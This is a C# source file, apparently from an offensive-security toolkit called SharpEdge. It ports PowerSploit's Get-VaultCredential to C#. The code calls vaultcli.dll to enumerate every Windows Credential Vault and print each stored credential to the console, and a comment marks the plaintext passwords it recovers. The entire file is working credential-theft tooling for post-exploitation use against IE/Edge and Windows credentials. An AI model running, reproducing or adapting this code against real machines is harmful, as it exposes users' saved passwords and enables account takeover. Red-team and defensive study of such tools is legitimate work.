b'\xef\xbb\xbfusing System;\r\nusing System.Collections.Generic;\r\nusing System.Text;\r\nusing System.Reflection;\r\nusing System.Reflection.Emit;\r\nusing System.IO;\r\nusing System.Runtime.InteropServices;\r\n\r\n/*\r\n * Author: Dwight Hohnstein (@djhohnstein)\r\n * \r\n * This is a C# implementation of Get-VaultCredential\r\n * from @mattifestation, whose PowerShell source is here:\r\n * https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-VaultCredential.ps1\r\n */\r\n\r\nnamespace SharpEdge\r\n{\r\n    // Thanks to @tifkin and @harmj0y for pointing out that\r\n    // Reflection is unecessary for defining these.\r\n    public static class VaultCli\r\n    {\r\n        public enum VAULT_ELEMENT_TYPE : Int32\r\n        {\r\n            Undefined = -1,\r\n            Boolean = 0,\r\n            Short = 1,\r\n            UnsignedShort = 2,\r\n            Int = 3,\r\n            UnsignedInt = 4,\r\n            Double = 5,\r\n            Guid = 6,\r\n            String = 7,\r\n            ByteArray = 8,\r\n            TimeStamp = 9,\r\n            ProtectedArray = 10,\r\n            Attribute = 11,\r\n            Sid = 12,\r\n            Last = 13\r\n        }\r\n\r\n        public enum VAULT_SCHEMA_ELEMENT_ID : Int32\r\n        {\r\n            Illegal = 0,\r\n            Resource = 1,\r\n            Identity = 2,\r\n            Authenticator = 3,\r\n            Tag = 4,\r\n            PackageSid = 5,\r\n            AppStart = 100,\r\n            AppEnd = 10000\r\n        }\r\n\r\n        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]\r\n        public struct VAULT_ITEM_WIN8\r\n        {\r\n            public Guid SchemaId;\r\n            public IntPtr pszCredentialFriendlyName;\r\n            public IntPtr pResourceElement;\r\n            public IntPtr pIdentityElement;\r\n            public IntPtr pAuthenticatorElement;\r\n            public IntPtr pPackageSid;\r\n            public UInt64 LastModified;\r\n            public UInt32 dwFlags;\r\n            public UInt32 dwPropertiesCount;\r\n            public IntPtr pPropertyElements;\r\n        }\r\n\r\n        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]\r\n        public struct VAULT_ITEM_WIN7\r\n        {\r\n            public Guid SchemaId;\r\n            public IntPtr pszCredentialFriendlyName;\r\n            public IntPtr pResourceElement;\r\n            public IntPtr pIdentityElement;\r\n            public IntPtr pAuthenticatorElement;\r\n            public UInt64 LastModified;\r\n            public UInt32 dwFlags;\r\n            public UInt32 dwPropertiesCount;\r\n            public IntPtr pPropertyElements;\r\n        }\r\n\r\n        [StructLayout(LayoutKind.Explicit, CharSet = CharSet.Ansi)]\r\n        public struct VAULT_ITEM_ELEMENT\r\n        {\r\n            [FieldOffset(0)] public VAULT_SCHEMA_ELEMENT_ID SchemaElementId;\r\n            [FieldOffset(8)] public VAULT_ELEMENT_TYPE Type;\r\n        }\r\n\r\n        [DllImport("vaultcli.dll")]\r\n        public extern static Int32 VaultOpenVault(ref Guid vaultGuid, UInt32 offset, ref IntPtr vaultHandle);\r\n\r\n        [DllImport("vaultcli.dll")]\r\n        public extern static Int32 VaultCloseVault(ref IntPtr vaultHandle);\r\n\r\n        [DllImport("vaultcli.dll")]\r\n        public extern static Int32 VaultFree(ref IntPtr vaultHandle);\r\n\r\n        [DllImport("vaultcli.dll")]\r\n        public extern static Int32 VaultEnumerateVaults(Int32 offset, ref Int32 vaultCount, ref IntPtr vaultGuid);\r\n\r\n        [DllImport("vaultcli.dll")]\r\n        public extern static Int32 VaultEnumerateItems(IntPtr vaultHandle, Int32 chunkSize, ref Int32 vaultItemCount, ref IntPtr vaultItem);\r\n\r\n        [DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]\r\n        public extern static Int32 VaultGetItem_WIN8(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr pPackageSid, IntPtr zero, Int32 arg6, ref IntPtr passwordVaultPtr);\r\n\r\n        [DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]\r\n        public extern static Int32 VaultGetItem_WIN7(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr zero, Int32 arg5, ref IntPtr passwordVaultPtr);\r\n\r\n    }\r\n\r\n    public class Edge\r\n    {\r\n        public static void GetLogins()\r\n        {\r\n            //Console.WriteLine("\\r\\n\\r\\n=== Checking Windows Vaults ===\\r\\n");\r\n            var OSVersion = Environment.OSVersion.Version;\r\n            var OSMajor = OSVersion.Major;\r\n            var OSMinor = OSVersion.Minor;\r\n\r\n            Type VAULT_ITEM;\r\n\r\n            if (OSMajor >= 6 && OSMinor >= 2)\r\n            {\r\n                VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN8);\r\n            }\r\n            else\r\n            {\r\n                VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN7);\r\n            }\r\n\r\n            /* Helper function to extract the ItemValue field from a VAULT_ITEM_ELEMENT struct */\r\n            object GetVaultElementValue(IntPtr vaultElementPtr)\r\n            {\r\n                object results;\r\n                object partialElement = System.Runtime.InteropServices.Marshal.PtrToStructure(vaultElementPtr, typeof(VaultCli.VAULT_ITEM_ELEMENT));\r\n                FieldInfo partialElementInfo = partialElement.GetType().GetField("Type");\r\n                var partialElementType = partialElementInfo.GetValue(partialElement);\r\n\r\n                IntPtr elementPtr = (IntPtr)(vaultElementPtr.ToInt64() + 16);\r\n                switch ((int)partialElementType)\r\n                {\r\n                    case 7: // VAULT_ELEMENT_TYPE == String; These are the plaintext passwords!\r\n                        IntPtr StringPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);\r\n                        results = System.Runtime.InteropServices.Marshal.PtrToStringUni(StringPtr);\r\n                        break;\r\n                    case 0: // VAULT_ELEMENT_TYPE == bool\r\n                        results = System.Runtime.InteropServices.Marshal.ReadByte(elementPtr);\r\n                        results = (bool)results;\r\n                        break;\r\n                    case 1: // VAULT_ELEMENT_TYPE == Short\r\n                        results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);\r\n                        break;\r\n                    case 2: // VAULT_ELEMENT_TYPE == Unsigned Short\r\n                        results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);\r\n                        break;\r\n                    case 3: // VAULT_ELEMENT_TYPE == Int\r\n                        results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);\r\n                        break;\r\n                    case 4: // VAULT_ELEMENT_TYPE == Unsigned Int\r\n                        results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);\r\n                        break;\r\n                    case 5: // VAULT_ELEMENT_TYPE == Double\r\n                        results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Double));\r\n                        break;\r\n                    case 6: // VAULT_ELEMENT_TYPE == GUID\r\n                        results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Guid));\r\n                        break;\r\n                    case 12: // VAULT_ELEMENT_TYPE == Sid\r\n                        IntPtr sidPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);\r\n                        var sidObject = new System.Security.Principal.SecurityIdentifier(sidPtr);\r\n                        results = sidObject.Value;\r\n                        break;\r\n                    default:\r\n                        /* Several VAULT_ELEMENT_TYPES are currently unimplemented according to\r\n                         * Lord Graeber. Thus we do not implement them. */\r\n                        results = null;\r\n                        break;\r\n                }\r\n                return results;\r\n            }\r\n            /* End helper function */\r\n\r\n            Int32 vaultCount = 0;\r\n            IntPtr vaultGuidPtr = IntPtr.Zero;\r\n            var result = VaultCli.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuidPtr);\r\n\r\n            //var result = CallVaultEnumerateVaults(VaultEnum, 0, ref vaultCount, ref vaultGuidPtr);\r\n\r\n            if ((int)result != 0)\r\n            {\r\n                throw new Exception("[ERROR] Unable to enumerate vaults. Error (0x" + result.ToString() + ")");\r\n            }\r\n\r\n            // Create dictionary to translate Guids to human readable elements\r\n            IntPtr guidAddress = vaultGuidPtr;\r\n            Dictionary<Guid, string> vaultSchema = new Dictionary<Guid, string>();\r\n            vaultSchema.Add(new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note");\r\n            vaultSchema.Add(new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential");\r\n            vaultSchema.Add(new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector");\r\n            vaultSchema.Add(new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials");\r\n            vaultSchema.Add(new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials");\r\n            vaultSchema.Add(new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential");\r\n            vaultSchema.Add(new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential");\r\n            vaultSchema.Add(new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential");\r\n            vaultSchema.Add(new Guid("00000000-0000-0000-0000-000000000000"), null);\r\n\r\n            for (int i = 0; i < vaultCount; i++)\r\n            {\r\n                // Open vault block\r\n                object vaultGuidString = System.Runtime.InteropServices.Marshal.PtrToStructure(guidAddress, typeof(Guid));\r\n                Guid vaultGuid = new Guid(vaultGuidString.ToString());\r\n                guidAddress = (IntPtr)(guidAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(typeof(Guid)));\r\n                IntPtr vaultHandle = IntPtr.Zero;\r\n                string vaultType;\r\n                if (vaultSchema.ContainsKey(vaultGuid))\r\n                {\r\n                    vaultType = vaultSchema[vaultGuid];\r\n                }\r\n                else\r\n                {\r\n                    vaultType = vaultGuid.ToString();\r\n                }\r\n                result = VaultCli.VaultOpenVault(ref vaultGuid, (UInt32)0, ref vaultHandle);\r\n                if (result != 0)\r\n                {\r\n                    throw new Exception("Unable to open the following vault: " + vaultType + ". Error: 0x" + result.ToString());\r\n                }\r\n                // Vault opened successfully! Continue.\r\n\r\n                // Fetch all items within Vault\r\n                int vaultItemCount = 0;\r\n                IntPtr vaultItemPtr = IntPtr.Zero;\r\n                result = VaultCli.VaultEnumerateItems(vaultHandle, 512, ref vaultItemCount, ref vaultItemPtr);\r\n                if (result != 0)\r\n                {\r\n                    throw new Exception("[ERROR] Unable to enumerate vault items from the following vault: " + vaultType + ". Error 0x" + result.ToString());\r\n                }\r\n                var structAddress = vaultItemPtr;\r\n                if (vaultItemCount > 0)\r\n                {\r\n                    // For each vault item...\r\n                    for (int j = 1; j <= vaultItemCount; j++)\r\n                    {\r\n                        // Begin fetching vault item...\r\n                        var currentItem = System.Runtime.InteropServices.Marshal.PtrToStructure(structAddress, VAULT_ITEM);\r\n                        structAddress = (IntPtr)(structAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(VAULT_ITEM));\r\n\r\n                        IntPtr passwordVaultItem = IntPtr.Zero;\r\n                        // Field Info retrieval\r\n                        FieldInfo schemaIdInfo = currentItem.GetType().GetField("SchemaId");\r\n                        Guid schemaId = new Guid(schemaIdInfo.GetValue(currentItem).ToString());\r\n                        FieldInfo pResourceElementInfo = currentItem.GetType().GetField("pResourceElement");\r\n                        IntPtr pResourceElement = (IntPtr)pResourceElementInfo.GetValue(currentItem);\r\n                        FieldInfo pIdentityElementInfo = currentItem.GetType().GetField("pIdentityElement");\r\n                        IntPtr pIdentityElement = (IntPtr)pIdentityElementInfo.GetValue(currentItem);\r\n                        FieldInfo dateTimeInfo = currentItem.GetType().GetField("LastModified");\r\n                        UInt64 lastModified = (UInt64)dateTimeInfo.GetValue(currentItem);\r\n\r\n                        object[] vaultGetItemArgs;\r\n                        IntPtr pPackageSid = IntPtr.Zero;\r\n                        if (OSMajor >= 6 && OSMinor >= 2)\r\n                        {\r\n                            // Newer versions have package sid\r\n                            FieldInfo pPackageSidInfo = currentItem.GetType().GetField("pPackageSid");\r\n                            pPackageSid = (IntPtr)pPackageSidInfo.GetValue(currentItem);\r\n                            result = VaultCli.VaultGetItem_WIN8(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, pPackageSid, IntPtr.Zero, 0, ref passwordVaultItem);\r\n                        }\r\n                        else\r\n                        {\r\n                            result = VaultCli.VaultGetItem_WIN7(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, IntPtr.Zero, 0, ref passwordVaultItem);\r\n                        }\r\n\r\n                        if (result != 0)\r\n                        {\r\n                            throw new Exception("Error occured while retrieving vault item. Error: 0x" + result.ToString());\r\n                        }\r\n                        object passwordItem = System.Runtime.InteropServices.Marshal.PtrToStructure(passwordVaultItem, VAULT_ITEM);\r\n                        FieldInfo pAuthenticatorElementInfo = passwordItem.GetType().GetField("pAuthenticatorElement");\r\n                        IntPtr pAuthenticatorElement = (IntPtr)pAuthenticatorElementInfo.GetValue(passwordItem);\r\n                        // Fetch the credential from the authenticator element\r\n                        object cred = GetVaultElementValue(pAuthenticatorElement);\r\n                        object packageSid = null;\r\n                        if (pPackageSid != IntPtr.Zero && pPackageSid != null)\r\n                        {\r\n                            packageSid = GetVaultElementValue(pPackageSid);\r\n                        }\r\n                        if (cred != null) // Indicates successful fetch\r\n                        {\r\n                            //Console.WriteLine("--- IE/Edge Credential ---");\r\n                            Console.WriteLine("\\tVault Type   : {0}", vaultType);\r\n                            object resource = GetVaultElementValue(pResourceElement);\r\n                            if (resource != null)\r\n                            {\r\n                                Console.WriteLine("\\tResource     : {0}", resource);\r\n                            }\r\n                            object identity = GetVaultElementValue(pIdentityElement);\r\n                            if (identity != null)\r\n                            {\r\n                                Console.WriteLine("\\tIdentity     : {0}", identity);\r\n                            }\r\n                            if (packageSid != null)\r\n                            {\r\n                                Console.WriteLine("\\tPacakgeSid  : {0}", packageSid);\r\n                            }\r\n                            Console.WriteLine("\\tCredential   : {0}", cred);\r\n                            // Stupid datetime\r\n                            Console.WriteLine("\\tLastModified : {0}", System.DateTime.FromFileTimeUtc((long)lastModified));\r\n                            Console.WriteLine();\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n}\r\n'